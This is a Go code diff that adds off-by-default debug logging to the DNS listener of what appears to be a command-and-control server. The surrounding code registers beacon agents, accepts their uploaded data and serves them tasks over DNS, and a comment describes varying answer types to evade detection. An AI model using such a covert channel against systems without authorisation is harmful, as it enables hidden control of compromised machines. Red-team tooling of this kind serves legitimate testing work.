@@ -16,6 +16,11 @@ import (
 	dns "github.com/miekg/dns"
 )
 
+// dnsDebug controls verbose logging for the DNS listener. It is disabled by
+// default so that release builds remain quiet. Set to true temporarily when
+// troubleshooting BeaconDNS behavior.
+const dnsDebug = false
+
 type DNS struct {
 	Config DNSConfig
 	Name   string
@@ -46,7 +51,9 @@ func (d *DNS) Start(ts Teamserver) error {
 
 	go func() {
 		if err := d.server.ListenAndServe(); err != nil {
-			fmt.Printf("[BeaconDNS] listener error: %v\n", err)
+			if dnsDebug {
+				fmt.Printf("[BeaconDNS] listener error: %v\n", err)
+			}
 		}
 	}()
 
@@ -113,6 +120,15 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			}
 		}
 
+		if dnsDebug {
+			remote := ""
+			if addr, ok := w.RemoteAddr().(*net.UDPAddr); ok {
+				remote = addr.IP.String()
+			}
+			fmt.Printf("[BeaconDNS] q from %s name=%s qtype=%d op=%s sid=%s seq=%d idx=%d len=%d\n",
+				remote, q.Name, q.Qtype, op, sid, seq, idx, len(dataB))
+		}
+
 		switch op {
 		case "HI", "PUT":
 			if len(dataB) > 0 {
@@ -131,6 +147,9 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 									if addr, ok := w.RemoteAddr().(*net.UDPAddr); ok {
 										externalIP = addr.IP.String()
 									}
+									if dnsDebug {
+										fmt.Printf("[BeaconDNS] HI create agent type=%s id=%s ip=%s\n", agentType, agentId, externalIP)
+									}
 									_, _ = d.ts.TsAgentCreate(agentType, agentId, beat, d.Name, externalIP, true)
 								}
 								_ = d.ts.TsAgentSetTick(agentId)
@@ -139,6 +158,9 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 					}
 				}
 				// 将payload交给 TS，sid 作为逻辑会话 ID（要求 Beacon 端保持一致）
+				if dnsDebug {
+					fmt.Printf("[BeaconDNS] %s payload len=%d sid=%s\n", op, len(dataB), sid)
+				}
 				_ = d.ts.TsAgentProcessData(sid, dataB)
 			}
 			// ACK：返回一个最小响应（不同 QType 返回不同 RR，以降低特征）
@@ -159,6 +181,9 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			if sid != "" {
 				if p, err := d.ts.TsAgentGetHostedTasks(sid, d.Config.PktSize); err == nil {
 					payload = p
+					if dnsDebug {
+						fmt.Printf("[BeaconDNS] GET tasks sid=%s pkt=%d\n", sid, len(payload))
+					}
 				}
 			}
 
